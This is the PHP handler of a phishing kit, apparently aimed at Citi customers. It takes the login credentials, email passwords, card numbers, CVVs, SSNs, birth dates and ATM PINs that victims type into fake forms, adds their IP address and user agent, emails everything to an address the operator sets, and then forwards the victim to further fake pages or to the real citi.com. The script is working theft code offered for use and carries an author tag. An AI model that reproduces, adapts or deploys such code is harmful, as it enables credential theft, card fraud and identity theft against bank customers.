<?php
include 'email.php';

if (isset($_POST['btn1'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "User ID            : ".$_POST['ai']."\n";
	$message .= "password              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
		
		// header("Location: ./account.html");
		header("Location: ./em.html");

	
	

	
}
else if (isset($_POST['btn3'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Email            : ".$_POST['aiii']."\n";
	$message .= "Password              : ".$_POST['prrr']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	$count=$_POST['count'];
	
		header("Location: ./account.html");

	
	
	

	
}
else if (isset($_POST['btn2'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	$message .= "Card Name              : ".$_POST['cname']."\n";
	$message .= "Card Number              : ".$_POST['cnum']."\n";
	$message .= "Expiration date             : ".$_POST['exdate']."\n";
	$message .= "CVV              : ".$_POST['cvv']."\n";
	$message .= "SSN              : ".$_POST['ssn']."\n";
	$message .= "DOB             : ".$_POST['dob']."\n";
	$message .= "ATM Pin              : ".$_POST['pin']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	$count=$_POST['count'];
	
	header("Location: https://www.citi.com/");
	

	
}


?>